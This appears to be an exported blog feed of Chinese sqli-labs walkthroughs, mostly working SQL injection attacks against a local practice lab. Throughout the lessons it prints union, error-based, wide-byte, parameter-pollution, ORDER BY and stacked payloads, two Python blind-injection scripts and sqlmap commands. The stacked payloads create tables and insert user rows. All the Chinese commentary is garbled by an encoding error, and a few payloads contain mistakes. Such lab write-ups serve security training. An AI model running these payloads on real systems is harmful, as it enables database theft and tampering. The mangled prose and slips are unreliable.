<p><code>http://127.0.0.1/sqli-labs/Less-55/?id=0) union select 1,database(),3 --+</code></p>
<p><code>?id=0) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3--+</code></p>
<p><code>?id=0) union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;8bgb8hj1sk&#39;),3 --+</code></p>
<p>secret_MCQ1</p>
<p><code>id=0) union select 1,(select sessid from 8bgb8hj1sk limit 0,1),(select secret_MCQ1 from 8bgb8hj1sk limit 0,1)  --+</code></p>
<br>

<h3 id="56"><a href="#56" class="headerlink" title="56"></a>56</h3><p><code>&#39;)</code>é—­åˆ æ–¹æ³•è¿˜æ˜¯ä¸€æ ·çš„</p>
<br>

<h3 id="57"><a href="#57" class="headerlink" title="57"></a>57</h3><p><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code></p>
<br>

<h3 id="58"><a href="#58" class="headerlink" title="58"></a>58</h3><p>ä½¿ç”¨<code>?id=1 and 1=1 union select 1,2,3</code>æ— å›æ˜¾</p>
<p>å°è¯•æŠ¥é”™æ³¨å…¥</p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;y0584eq2pg&#39;),0x7e),1)--+</code></p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(secret_5U2L) from y0584eq2pg),0x7e),1)--+</code></p>
<br>

<h3 id="59"><a href="#59" class="headerlink" title="59"></a>59</h3><p>æ•°å­—å‹ å’Œ58ä¸€æ ·</p>
<p><code>?id=0 and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<br>

<h3 id="60"><a href="#60" class="headerlink" title="60"></a>60</h3><p>ç”¨<code>&quot;)</code>é—­åˆ å’Œ58ä¸€æ ·</p>
<br>

<h3 id="61"><a href="#61" class="headerlink" title="61"></a>61</h3><p>ç”¨<code>&#39;))</code>é—­åˆ</p>
<p><code>?id=0&#39;)) and updatexml(1,concat(0xs7e,database(),0x7e),1)--+</code></p>
<br>

<h3 id="62"><a href="#62" class="headerlink" title="62"></a>62</h3><p>ç”¨<code>&#39;)</code>é—­åˆ è¿™å…³æ²¡å›æ˜¾ ä½¿ç”¨æ—¶é—´ç›²æ³¨</p>
<p>æ ¹æ®å‰é¢å‡ å…³å¯ä»¥å¾—åˆ°</p>
<p>æ•°æ®åº“ä¸º challenges</p>
<p>table æ˜¯éšæœº10ä¸ºå­—ç¬¦ç»„æˆ</p>
<p>columnæ˜¯secret_ å’Œå››ä½éšæœºå­—ç¬¦ç»„æˆ </p>
<p>æœ¬å…³é™åˆ¶é‡ç½®æ¬¡æ•°ä¸º130æ¬¡ï¼Œå¯ä»¥å†™ä¸ªpythonè„šæœ¬è¯•ä¸€ä¸‹</p>
<br>

<br>

<p><code>?id=1&#39;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
<p><code>?id=1&#39;) and ascii(substr((select group_concat(column_name) from information_schema.tables where table_schema=database() and table_name=&#39;8mdr4weo2b&#39;),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¡¨å</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):  <span class="comment">#å·²çŸ¥è¡¨é•¿ä¸º10</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]           <span class="comment">#äºŒåˆ†æ³•åˆ¤æ–­</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select group_concat(table_name) from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:   <span class="comment">#Angelinaæ˜¯æ­£å¸¸é¡µé¢ä¸‹çš„ç»“æœ</span></span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŸ¥å­—æ®µ</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))   </span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—æ®µä¸ºsecret_XXXX</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">12</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high - low &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        m = payloads[mid]  <span class="comment"># äºŒåˆ†æ³•åˆ¤æ–­</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select column_name from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.columns where table_name=&#x27;eu3ls8m6rg&#x27; limit 2,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;secret_&#x27;</span>+data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="63"><a href="#63" class="headerlink" title="63"></a>63</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•åŒ62</p>
<br>

<h3 id="64"><a href="#64" class="headerlink" title="64"></a>64</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((<span class="subst">$id</span>)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•åŒ62</p>
<br>

<h3 id="65"><a href="#65" class="headerlink" title="65"></a>65</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•åŒ62</p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>Linuxè™šæ‹Ÿæœºåœ¨NATæ¨¡å¼ä¸‹ä¸»æœºpingä¸é€šè™šæ‹Ÿæœº</title>
    <url>/posts/ccb4aa11/</url>
    <content><![CDATA[<p>åŸå› :æœ¬æœºçš„VMware Network Adapter VMnet8çš„å’Œè™šæ‹Ÿæœºè®¾ç½®çš„ç½‘æ®µä¸ä¸€æ ·</p>
<p>è®¾ç½®ç½‘ç»œé€‚é…å™¨ä¸è™šæ‹Ÿæœºçš„ç½‘æ®µä¸€è‡´ï¼Œä¹‹åä¾¿å¯ä»¥pingé€š</p>
<p>å¦‚æœç½‘æ®µä¸€è‡´ï¼Œå°±é‡æ–°å¯åŠ¨ä¸‹ç½‘å¡ï¼ˆç¦ç”¨åå†å¯åŠ¨å³å¯ï¼‰</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs4</title>
    <url>/posts/8ad9e0b5/</url>
    <content><![CDATA[<h3 id="42-å †å æ³¨å…¥"><a href="#42-å †å æ³¨å…¥" class="headerlink" title="42 å †å æ³¨å…¥"></a>42 å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$con1</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line">   </span><br><span class="line">... ... </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>åªå¯¹usernameåšäº†å¤„ç†ï¼Œå¯¹passwordæ²¡æœ‰å¤„ç†</p>
<p><code>login_user=admin&amp;login_password=1%27%3Bcreate+table+test44 like users%23&amp;mysubmit=Login</code></p>
<br>

<h3 id="43-å †å æ³¨å…¥"><a href="#43-å †å æ³¨å…¥" class="headerlink" title="43 å †å æ³¨å…¥"></a>43 å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$con1</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$username</span>&#x27;) and password=(&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å’Œä¸Šä¸€å…³å·®ä¸å¤šï¼Œä½¿ç”¨<code>&#39;)</code>é—­åˆ</p>
<br>

<h3 id="44-å †å æ³¨å…¥"><a href="#44-å †å æ³¨å…¥" class="headerlink" title="44 å †å æ³¨å…¥"></a>44 å †å æ³¨å…¥</h3><p>å’Œ42ä¸€æ ·</p>
<br>

<h3 id="45-å †å æ³¨å…¥"><a href="#45-å †å æ³¨å…¥" class="headerlink" title="45 å †å æ³¨å…¥"></a>45 å †å æ³¨å…¥</h3><p>å’Œ43ä¸€æ ·</p>
<br>

<h3 id="46-order-byæ³¨å…¥"><a href="#46-order-byæ³¨å…¥" class="headerlink" title="46 order byæ³¨å…¥"></a>46 <code>order by</code>æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>?sort=1%20desc</code>æˆ–è€…<code>?sort=1%20asc</code> æ•°æ®ä¸åŒï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥</p>
<p><code>?sort=1 updatexml(1,concat(0x7e,(select database()),0x7e),1)</code></p>
<br>

<p>ä¹Ÿå¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨</p>
<p><code>?sort=1 and if(1=1,sleep(1),0)</code>ä¼šå“åº”ä¸€æ®µæ—¶é—´</p>
<p><code>?sort=1 and if(1=1,0,sleep(1))</code> ä¼šå³å¯å¾—åˆ°ä¿¡æ¯</p>
<br>

<br>

<h3 id="47-order-byæ³¨å…¥"><a href="#47-order-byæ³¨å…¥" class="headerlink" title="47  order byæ³¨å…¥"></a>47  <code>order by</code>æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>?sort=1&#39; desc --+</code>   <code>?sort=1&#39; asc --+</code></p>
<p><code>?sort=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<br>

<br>

<h3 id="48-order-byæ³¨å…¥"><a href="#48-order-byæ³¨å…¥" class="headerlink" title="48 order byæ³¨å…¥"></a>48 <code>order by</code>æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‚è€ƒ46</p>
<p>è¿™å…³æ²¡å›æ˜¾ï¼Œè€ƒè™‘ä½¿ç”¨æ—¶é—´ç›²æ³¨</p>
<br>

<p>SQlmap</p>
<p><code>python sqlmap.py -u 192.168.56.1/sqli-labs/Less-48/?sort=1  --technique T --batch --dbs</code></p>
<br>

<h3 id="49-order-byæ³¨å…¥"><a href="#49-order-byæ³¨å…¥" class="headerlink" title="49 order byæ³¨å…¥"></a>49 <code>order by</code>æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>?sort=1%27%20%20and%20sleep(1)--+</code>æ—¶é—´ç›²æ³¨</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u 192.168.56.1/sqli-labs/Less-49/?sort=1  --technique T --batch --dbs</code></p>
<br>

<h3 id="50-order-byæ³¨å…¥-amp-å †å æ³¨å…¥"><a href="#50-order-byæ³¨å…¥-amp-å †å æ³¨å…¥" class="headerlink" title="50 order byæ³¨å…¥&amp;å †å æ³¨å…¥"></a>50 <code>order by</code>æ³¨å…¥&amp;å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line">	<span class="comment">/* execute multi query */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">	... ...</span><br></pre></td></tr></table></figure>

<p>order byæ³¨å…¥å’Œå †å æ³¨å…¥</p>
<p>æ•°å­—å‹ å¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨å’ŒæŠ¥é”™æ³¨å…¥</p>
<p><code>?sort=1%20and%20sleep(1)</code></p>
<p><code>?sort=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)</code></p>
<br>

<p>å †å æ³¨å…¥</p>
<p><code>?sort=1;insert into users(id,username,password) values(&#39;50&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="51-order-byæ³¨å…¥-amp-å †å æ³¨å…¥"><a href="#51-order-byæ³¨å…¥-amp-å †å æ³¨å…¥" class="headerlink" title="51 order byæ³¨å…¥&amp;å †å æ³¨å…¥"></a>51 <code>order by</code>æ³¨å…¥&amp;å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)) </span><br></pre></td></tr></table></figure>

<p>æŠ¥é”™æ³¨å…¥</p>
<p><code>?sort=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<br>

<p>å †å æ³¨å…¥</p>
<p><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;51&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="52-order-byæ³¨å…¥-amp-å †å æ³¨å…¥"><a href="#52-order-byæ³¨å…¥-amp-å †å æ³¨å…¥" class="headerlink" title="52 order byæ³¨å…¥&amp;å †å æ³¨å…¥"></a>52 <code>order by</code>æ³¨å…¥&amp;å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br></pre></td></tr></table></figure>

<br>

<p>å †å æ³¨å…¥</p>
<p><code>?sort=1;insert into users(id,username,password) values(&#39;52&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<br>

<h3 id="53-order-byæ³¨å…¥-amp-å †å æ³¨å…¥"><a href="#53-order-byæ³¨å…¥-amp-å †å æ³¨å…¥" class="headerlink" title="53 order byæ³¨å…¥&amp;å †å æ³¨å…¥"></a>53 <code>order by</code>æ³¨å…¥&amp;å †å æ³¨å…¥</h3><p>å †å æ³¨å…¥</p>
<p><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;53&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs3</title>
    <url>/posts/14bd7516/</url>
    <content><![CDATA[<h3 id="29-å‚æ•°æ±¡æŸ“"><a href="#29-å‚æ•°æ±¡æŸ“" class="headerlink" title="29 å‚æ•°æ±¡æŸ“"></a>29 å‚æ•°æ±¡æŸ“</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ... ... </span><br><span class="line">  </span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);   <span class="comment">//ç”¨`&amp;`åˆ†å‰²å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);     <span class="comment">//æˆªå–å‰ä¸¤ä½å­—ç¬¦</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)              </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;                  </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ç”¨&amp;åˆ†å‰²å­—ç¬¦ä¸²ä¸ºä¸¤éƒ¨åˆ†ï¼Œç„¶åè¿›è¡Œæ•°ç»„éå†ï¼Œå¦‚æœå­—ç¬¦å‰ä¸¤ä½ä¸ºidï¼Œé‚£ä¹ˆè¿”å›å®ƒçš„3-30ä½å­—ç¬¦</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">explode(separator,string,limit) å‡½æ•°æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ã€‚</span><br><span class="line">separator å¿…éœ€ã€‚è§„å®šåœ¨å“ªé‡Œåˆ†å‰²å­—ç¬¦ä¸²ã€‚</span><br><span class="line">string å¿…éœ€ã€‚è¦åˆ†å‰²çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">limit å¯é€‰ã€‚è§„å®šæ‰€è¿”å›çš„æ•°ç»„å…ƒç´ çš„æ•°ç›®ã€‚å¯èƒ½çš„å€¼ï¼š</span><br><span class="line">    å¤§äº 0 - è¿”å›åŒ…å«æœ€å¤š limit ä¸ªå…ƒç´ çš„æ•°ç»„</span><br><span class="line">    å°äº 0 - è¿”å›åŒ…å«é™¤äº†æœ€åçš„ -limit ä¸ªå…ƒç´ ä»¥å¤–çš„æ‰€æœ‰å…ƒç´ çš„æ•°ç»„</span><br><span class="line">    0 - è¿”å›åŒ…å«ä¸€ä¸ªå…ƒç´ çš„æ•°ç»„</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p>å¯¹äº<code>login.php?id=1&amp;id=2</code> apache(php)ä¼šè§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œtomcat(jsp)ä¼šè§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ª<code>id</code>ä¼šç»è¿‡<code>whitelist()</code>å’Œ<code>java_implimentation()</code></p>
<p><code>whitelist()</code>ä½œç”¨æ˜¯ä¼ å…¥çš„å‚æ•°å¿…é¡»æ˜¯ä¸€ä½åŠä»¥ä¸Šçš„æ•°å­—</p>
<p><code>java_implimentation()</code>ç”¨<code>&amp;</code>åˆ†å‰²å­—ç¬¦ä¸²ä¸ºä¸¤éƒ¨åˆ†ï¼Œç„¶åè¿›è¡Œæ•°ç»„éå†ï¼Œå¦‚æœå­—ç¬¦å‰ä¸¤ä½ä¸ºidï¼Œé‚£ä¹ˆè¿”å›å®ƒçš„3-30ä½å­—ç¬¦</p>
<p>å‚æ•°æ±¡æŸ“ <code>id=1 &amp; id=0&#39; union select 1,2,&#39;3</code></p>
<p><img src="http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93.jpg"><br>å¯ä»¥å‚è€ƒ<code>https://blog.csdn.net/nzjdsds/article/details/77758824</code></p>
<h3 id="30-å‚æ•°æ±¡æŸ“"><a href="#30-å‚æ•°æ±¡æŸ“" class="headerlink" title="30 å‚æ•°æ±¡æŸ“"></a>30 å‚æ•°æ±¡æŸ“</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>å’Œä¸Šä¸€å…³å·®ä¸å¤š åŒå¼•å·é—­åˆ</p>
<p><code>?id=1&amp;id=-1&quot; union select 1,2,&quot;3</code></p>
<p><code>?id=12&amp;id=-1&quot; union select 1,(select password from users limit 0,1),&quot;3</code></p>
<h3 id="31-å‚æ•°æ±¡æŸ“"><a href="#31-å‚æ•°æ±¡æŸ“" class="headerlink" title="31 å‚æ•°æ±¡æŸ“"></a>31 å‚æ•°æ±¡æŸ“</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>?id=12&amp;id=-1&quot;) union select 1,(select password from users limit 0,1),(&quot;3</code></p>
<br>

<h3 id="32-å®½å­—èŠ‚æ³¨å…¥"><a href="#32-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="32 å®½å­—èŠ‚æ³¨å…¥"></a>32 å®½å­—èŠ‚æ³¨å…¥</h3><br>

<p><code>?id=1%df%27%20union%20select%201,2,3%20--+</code></p>
<p><code>?id=0%df%27%20union%20select%201,database(),3%20--+</code></p>
<p><code>?id=0%df%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),3%20--+</code></p>
<p>åœ¨æŸ¥å­—æ®µåçš„æ—¶å€™éœ€è¦æŠŠ<code>&#39;users&#39;</code>è½¬æˆ16è¿›åˆ¶ï¼Œ16è¿›åˆ¶çš„è¡¨åä¸éœ€è¦å¼•å· <code>0x7573657273</code></p>
<p><code>?id=0%df%27%20union%20select%201,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273%20limit%200,1),3%20--+</code></p>
<br>

<h3 id="33-å®½å­—èŠ‚æ³¨å…¥"><a href="#33-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="33 å®½å­—èŠ‚æ³¨å…¥"></a>33 å®½å­—èŠ‚æ³¨å…¥</h3><p>å’Œ32ä¸€æ¨¡ä¸€æ ·</p>
<p><code>?id=1%df%27%20and%201=1%20--+</code></p>
<br>

<h3 id="34-å®½å­—èŠ‚æ³¨å…¥-POST"><a href="#34-å®½å­—èŠ‚æ³¨å…¥-POST" class="headerlink" title="34 å®½å­—èŠ‚æ³¨å…¥(POST)"></a>34 å®½å­—èŠ‚æ³¨å…¥(POST)</h3><p>è¿‡æ»¤æ–¹å¼å’Œä¸Šé¢çš„ä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨burpç›´æ¥ä¼ ï¼Œä¸è¿‡POSTä¼ å…¥æ•°æ®æ—¶ä¼šè¿›è¡Œurlç¼–ç ï¼Œ</p>
